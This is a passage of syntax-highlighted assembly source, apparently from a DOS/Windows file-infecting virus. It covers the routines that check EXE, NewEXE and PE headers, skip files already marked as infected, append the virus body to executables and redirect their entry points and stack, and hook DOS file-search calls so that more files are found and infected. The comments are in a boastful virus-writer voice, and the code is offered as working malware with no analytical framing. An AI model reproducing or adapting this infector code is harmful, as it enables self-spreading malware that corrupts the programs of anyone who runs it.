                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">restore_ne</span><span class="sc0">                  </span><span class="sc1">; infection limit?</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                      </span><span class="sc1">; If not, look for more</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'C'</span><span class="sc0"> </span><span class="sc1">; files to infect, both</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">find_more_com</span><span class="sc0">               </span><span class="sc1">; EXE and COM, depending</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">find_more_exe</span><span class="sc0">               </span><span class="sc1">; on their availability</span><span class="sc0">

</span><span class="sc5">memory_exit</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                       </span><span class="sc1">; Jump back to the int</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">                                </span><span class="sc1">; 21h handler and keep</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">                                </span><span class="sc1">; on intercepting 4eh</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">                           </span><span class="sc1">; and 4fh to infect</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ EXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check_exe</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                       </span><span class="sc1">; DS = ES (to open files</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; in DS:DX and ES:DX)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                    </span><span class="sc1">; Open the file we've</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; found in DS:DX (from</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; memory) or ES:DX (from</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; the runtime infection)</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">system_checks</span><span class="sc0">               </span><span class="sc1">; Do some checks in</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">                       </span><span class="sc1">; order to know if we</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; may infect the file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read its first 41h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">; bytes into our read</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">old_exe_header</span><span class="sc0">           </span><span class="sc1">; buffer and point it</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; with DS:DX and DS:SI</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; First word in AX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">; Add the 2 first bytes</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">+</span><span class="sc12">'Z'</span><span class="sc0">                  </span><span class="sc1">; And check for the MZ</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; mark (DOS EXE files)</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">   </span><span class="sc1">; Have we already</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; infected the file?</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; We don't like evil</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; overlays :P</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1eh</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0">   </span><span class="sc1">; Nor PkLited EXE files,</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; they plainly suck</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_end</span><span class="sc0">                   </span><span class="sc1">; Lseek to the end of</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">espo_file_size</span><span class="sc4">+</span><span class="sc2">3e8h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; the file and check if</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; it's too small for us</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">    </span><span class="sc1">; Is it a WinXX file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_winexe</span><span class="sc0">                </span><span class="sc1">; Yep, go for it!</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ EXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect_exe</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">file_flag</span><span class="sc4">],</span><span class="sc12">'E'</span><span class="sc0"> </span><span class="sc1">; Set the EXE flag in</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increment the counter</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">; DX:AX -&gt; file size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">                      </span><span class="sc1">; CX -&gt; paragraph size</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; Now divide the length</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Header size in paras</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_exe_entry</span><span class="sc0">     </span><span class="sc1">; Add the entry offset</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; AX = new EXE CS</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exe_cs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Save old EXE CS</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Restore AX from stack</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; DX = new EXE IP</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exe_ip</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Save old EXE IP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; Restore DX from stack</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">espo_file_end</span><span class="sc4">+</span><span class="sc2">320h</span><span class="sc0"> </span><span class="sc1">; Add 320h to the virus</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0feh</span><span class="sc0">                     </span><span class="sc1">; size in order to set SP</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exe_ss</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; And save old EXE SS</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Exchange the values</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exe_sp</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; And save old EXE SP</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">; DX:AX -&gt; file size</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">           </span><span class="sc1">; Add virus size to AX</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">; And add with carry</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                     </span><span class="sc1">; CX -&gt; page size</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">; Divide the length</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">; Increment one page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Bytes in last page</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Pages in EXE file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">   </span><span class="sc1">; Set our own mark</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Append our code to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">espo_file_size</span><span class="sc0">           </span><span class="sc1">; the end of the EXE</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">espo_start</span><span class="sc0">               </span><span class="sc1">; file we've almost</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; infected :P</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; And now write the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1ch</span><span class="sc0">                      </span><span class="sc1">; new header with the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; updated pointers</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; instead of the old one</span><span class="sc0">
</span><span class="sc5">go_away</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; Close file and exit</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ NewEXE files check routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">check_winexe</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">winexe_data</span><span class="sc0">              </span><span class="sc1">; Point to our buffer</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save the pointer to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">; the new EXE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc12">');'</span><span class="sc0">   </span><span class="sc1">; Set our infection mark</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; Substract a quadword</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3eh</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; Enough room for us?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">                     </span><span class="sc1">; Oops... shit... :(</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; Write in the changes</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; we've just made in</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; the pointers of the</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; MZ header of the file</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Lseek to the new EXE</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_middle</span><span class="sc0">                </span><span class="sc1">; header (MZ+[3ch])</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; Read 200h bytes from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                     </span><span class="sc1">; the start of the new</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; EXE file to our buffer</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; and point to it</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">       </span><span class="sc1">; Is it a PE file?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">check_pe</span><span class="sc0">                    </span><span class="sc1">; Go and eat it!</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'EN'</span><span class="sc0">       </span><span class="sc1">; Maybe a NewEXE file?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">bad_winexe</span><span class="sc0">                  </span><span class="sc1">; Argh! that's bad luck</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">],</span><span class="sc2">802h</span><span class="sc0">   </span><span class="sc1">; Does it have gangload</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">infect_newexe</span><span class="sc0">               </span><span class="sc1">; area? good to know ;)</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; Lseek to start of the</span><span class="sc0">
</span><span class="sc5">bad_winexe</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                      </span><span class="sc1">; file and read again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">                      </span><span class="sc1">; the MZ header because</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; we have to remodify it</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">; Update the pointer to</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">lseek_start</span><span class="sc0">                 </span><span class="sc1">; the new EXE header</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; And rewrite the MZ</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                      </span><span class="sc1">; header, stored in our</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; read buffer (pointed</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; by DS:DX and DS:SI)</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">close_and_pop</span><span class="sc0">               </span><span class="sc1">; Close file and exit</span><span class="sc0">

</span><span class="sc1">; ÄÄ´ NewEXE files infection routine ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">infect_newexe</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">inf_counter</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Increment the counter</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">22h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Distance to seg.table</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                        </span><span class="sc1">; Value we have to add</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; to the pointers which</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">first_ok</span><span class="sc0">                    </span><span class="sc1">; are equal to AX</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">       </span><span class="sc1">; Update first pointer</span><span class="sc0">
</span><span class="sc5">first_ok</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                        </span><span class="sc1">; 4 pointers to update</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; Push SI onto stack</span><span class="sc0">
